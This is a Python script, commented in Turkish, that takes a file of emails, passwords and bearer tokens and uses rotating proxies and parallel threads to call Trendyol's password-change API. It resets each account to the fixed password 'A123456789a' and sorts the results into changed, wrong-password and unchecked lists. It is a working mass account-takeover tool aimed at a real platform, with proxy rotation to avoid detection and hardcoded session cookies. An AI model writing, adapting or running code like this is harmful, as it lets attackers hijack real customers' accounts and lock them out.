import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor
import json
import os

# Header bilgileri
headers = {
    "culture": "tr-TR",
    "storefront-id": "1",
    "application-id": "1",
    "Content-Type": "application/json"
}

# API endpoint - Gerçek bir API URL'si kullanın
url = "https://public-sdc.trendyol.com/discovery-web-membergw-service/api/user/password?culture=tr-TR&storefrontId=1&channelId=1"

# Kullanıcı verilerini içeren dosyanın adı
kullanici_dosyasi = "/kullanıcı/dosyası/yolu.json"

# Proxy listesi
proxy_dosyasi = "/proxy/dosyası/yolu.json"

with open(proxy_dosyasi, 'r') as dosya:
    proxy_listesi = eval(dosya.read())

# Çerezler
cookies = {
    "__cfruid": "69cceb511859cd6579d62312074e7f5bd18589ce-1717159388",
    "_cfuvid": "g.d1HdCaB5EJbqqhNZc0sSlGh7OAu5UqZkq1.9qEAjU-1717159388907-0.0.1.1-604800000"
}

# Şifre değiştirme sonuçlarını kaydetmek için klasörler
sifre_değisenler = []
yanlis_sifreli_hesaplar = []
kontrol_edilmemis_hesaplar = []
bekleme_suresi = 0

# Proxy formatını düzenlemek için yardımcı fonksiyon
def proxy_formatla(proxy):
    ip, port, kullanici_adi, sifre = proxy.split(':')
    return f"http://{kullanici_adi}:{sifre}@{ip}:{port}"

def api_istegi(email, sifre, token, proxy):
    data = {
        "password": "A123456789a",
        "passwordAgain": "A123456789a",
        "oldPassword": sifre
    }
    proxies = {
        "http": proxy,
        "https": proxy
    }
    session = requests.Session()
    session.headers.update(headers)
    session.headers.update({"Authorization": f"Bearer {token}"})
    session.cookies.update(cookies)

    try:
        # POST isteği gönderme
        response = session.put(url, json=data, proxies=proxies)

        # Cevabı kontrol etme
        if response.status_code == 200:
            # Başarılı istek
            print(f"{proxy} - Başarılı: {email} - {response.json()}")
            sifre_değisenler.append({"email": email, "sifre": sifre})
        elif response.status_code == 400:
            # Yanlış şifre
            print(f"{proxy} -  400 Hatası: Yanlış şifre - {email}")
            yanlis_sifreli_hesaplar.append({"email": email, "sifre": sifre})
        else:
            # Diğer hata durumları
            print(f"{proxy} -  Hata: {email} - {response.status_code} - {response.text}")
            kontrol_edilmemis_hesaplar.append({"email": email, "sifre": sifre})
    except requests.exceptions.RequestException as e:
        print(f"{proxy} -  İstek sırasında bir hata oluştu: {email} - {e}")
        kontrol_edilmemis_hesaplar.append({"email": email, "sifre": sifre})

def kaydet():
    # Şifre değişen hesapları JSON dosyasına yaz
    if sifre_değisenler:
        os.makedirs("sifresi_değisenler", exist_ok=True)
        with open("sifresi_değisenler/sifresi_değisenler.json", 'w') as dosya:
            json.dump(sifre_değisenler, dosya, ensure_ascii=False, indent=4)

    # Yanlış şifreli hesapları JSON dosyasına yaz
    if yanlis_sifreli_hesaplar:
        os.makedirs("yanlis_sifreli_hesaplar", exist_ok=True)
        with open("yanlis_sifreli_hesaplar/yanlis_sifreli_hesaplar.json", 'w') as dosya:
            json.dump(yanlis_sifreli_hesaplar, dosya, ensure_ascii=False, indent=4)
    
    # Kontrol edilmemiş hesapları JSON dosyasına yaz
    if kontrol_edilmemis_hesaplar:
        os.makedirs("kontrol_edilmemis_hesaplar", exist_ok=True)
        with open("kontrol_edilmemis_hesaplar/kontrol_edilmemis_hesaplar.json", 'w') as dosya:
            json.dump(kontrol_edilmemis_hesaplar, dosya, ensure_ascii=False, indent=4)

# Dosyadan kullanıcı verilerini oku ve API'ye gönder
with open(kullanici_dosyasi, 'r') as dosya:
    kullanicilar = json.load(dosya)


proxy_index = 0
kontrol_edilen_kullanici = 0

with ThreadPoolExecutor(max_workers=6) as executor:  # Paralel iş parçacığı sayısını ayarlayın
    for kullanici in kullanicilar:
        email = kullanici.get("email")
        sifre = kullanici.get("sifre")
        token = kullanici.get("token")
        proxy = proxy_listesi[proxy_index % len(proxy_listesi)]
        executor.submit(api_istegi, email, sifre, token, proxy)
        proxy_index += 1
        time.sleep(bekleme_suresi)

# İşlem tamamlandığında dosyaları kaydet
kaydet()
